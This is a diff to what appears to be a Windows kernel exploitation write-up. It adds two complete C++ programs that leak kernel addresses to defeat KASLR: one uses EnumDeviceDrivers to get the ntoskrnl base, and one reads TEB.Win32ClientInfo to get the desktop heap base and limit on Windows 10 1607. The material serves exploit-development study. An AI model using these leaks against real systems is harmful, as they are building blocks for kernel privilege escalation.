@@ -25,6 +25,40 @@ This post will only be covering one leak per Windows version, as there are many 
 
 This is the classic and easiest technique for bypassing KASRL using the EnumDeviceDrivers winAPI function to get the base address of ntoskrnl, this technique works on pretty much every Windows version. But it requires at least medium-integrity execution. 
 
+```c++
+#include <windows.h>
+#include <iostream>
+#include <Psapi.h>
+
+int main() {
+
+	LPVOID drivers[1024];
+	DWORD cbNeeded;
+
+	BOOL enumVar = EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
+	std::cout << "[+] Preparing KASLR information leak with EnumDeviceDrivers()\n";
+	std::cout << "[+] Getting kernel base address\n";
+	PVOID KernelBaseAddress = { 0 };
+	KernelBaseAddress = drivers[0];
+
+	if (enumVar == 0) {
+
+		TCHAR  err[256];
+		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(),
+			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err, 255, NULL);
+
+		std::cout << "kASLR leakage failed! - " << err << std::endl;
+		std::cout << "This probably means your of low integrity!\n";
+	}
+	else {
+		std::cout << "[+] Successfully leaked the kernel base address\n";
+		std::cout << "\t[>] Kernel base address -  0x" << KernelBaseAddress << std::endl;
+	}
+
+	return 0;
+}
+```
+
 ![desktop heap leakage](https://github.com/FULLSHADE/LEAKYDRIPPER/blob/master/images/EnumDeviceDrivers.PNG)
 
 ### Windows 10 1607 kernel information leakage
@@ -164,6 +198,60 @@ And now for the finale you can cout them to view the various (now) leaked kernel
     std::cout << "\t[>] ulClientDelta                : " << std::hex << "0x" << ulClientDelta << std::endl;
     std::cout << "\t[>] Kernel Desktop base address  : " << pvDesktopBase << std::endl;
     std::cout << "\t[>] Kernel Desktop limit address : " << pvDesktopLimit << std::endl;
+```
+
+```c++
+#include <Windows.h>
+#include <iostream>
+
+typedef struct _TEB {
+	UCHAR ignored[0x0800];
+	ULONG_PTR Win32ClientInfo[0x3E]; // some undocumented stuff , located at TEB + 800
+} TEB, *PTEB;
+
+// taken from reactOS https://doxygen.reactos.org/dd/d79/include_2ntuser_8h_source.html
+typedef struct _DESKTOPINFO
+{
+    PVOID pvDesktopBase;
+    PVOID pvDesktopLimit;
+} DESKTOPINFO, *PDESKTOPINFO;
+
+// pvDesktopBase points to the kernel address of the desktop heap
+// ulClientDelta specifies the offset between userland image and kernel address
+// ulClientDelta is used for computing the user-space address of desktop heap objects
+
+// taken from reactOS https://reactos.org/wiki/Techwiki:Win32k/CLIENTINFO
+// taken from https://github.com/55-AA/CVE-2016-3308
+typedef struct _CLIENTINFO
+{
+    ULONG_PTR CI_flags;
+    ULONG_PTR cSpins;
+    DWORD dwExpWinVer;
+    DWORD dwCompatFlags;
+    DWORD dwCompatFlags2;
+    DWORD dwTIFlags;
+    PDESKTOPINFO pDeskInfo;
+    ULONG_PTR ulClientDelta;
+} CLIENTINFO, *PCLIENTINFO;
+
+int main() {
+
+    PTEB pTeb = NtCurrentTeb();
+    PCLIENTINFO clientInfoStruct = (PCLIENTINFO)pTeb->Win32ClientInfo;
+    // from Mortens Defcon 2017 talk slides
+
+    ULONG_PTR ulClientDelta  = clientInfoStruct->ulClientDelta;
+    PVOID pvDesktopBase = clientInfoStruct->pDeskInfo->pvDesktopBase;
+    PVOID pvDesktopLimit = clientInfoStruct->pDeskInfo->pvDesktopLimit;
+
+    std::cout << "\n[+] Windows 10 1607 DesktopHeap (TEB.Win32ClientInfo) kernel address leakage\n\n";
+
+    std::cout << "\t[>] ulClientDelta                : " << "0x" << ulClientDelta << std::endl;
+    std::cout << "\t[>] Kernel Desktop base address  : " << "0x" << pvDesktopBase << std::endl;
+    std::cout << "\t[>] Kernel Desktop limit address : " << "0x" << pvDesktopLimit << std::endl;
+
+    return 0;
+}
 ```
 
 ![leaked](https://raw.githubusercontent.com/FULLSHADE/Win10InfoLeaks/master/images/DesktopHeapLeak.png)
